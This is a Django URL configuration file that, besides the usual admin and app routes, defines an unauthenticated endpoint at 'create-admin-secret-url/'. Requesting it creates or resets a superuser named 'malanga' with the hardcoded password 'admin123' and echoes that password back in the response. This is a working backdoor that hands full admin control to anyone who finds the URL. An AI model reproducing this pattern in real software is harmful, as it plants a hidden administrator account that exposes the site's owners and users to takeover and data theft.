from django.contrib import admin
from django.urls import path, include
from django.conf import settings
from django.conf.urls.static import static
from django.http import HttpResponse
from django.contrib.auth.models import User

def create_admin_secret(request):
    if not User.objects.filter(username='malanga').exists():
        User.objects.create_superuser('malanga', 'admin@example.com', 'admin123')
        return HttpResponse('Admin malanga created with password admin123')
    else:
        u = User.objects.get(username='malanga')
        u.set_password('admin123')
        u.save()
        return HttpResponse('Admin malanga password reset to admin123')

urlpatterns = [
    path('admin/', admin.site.urls),
    path('create-admin-secret-url/', create_admin_secret),
    path('', include('core.urls')),
]

if settings.DEBUG:
    urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
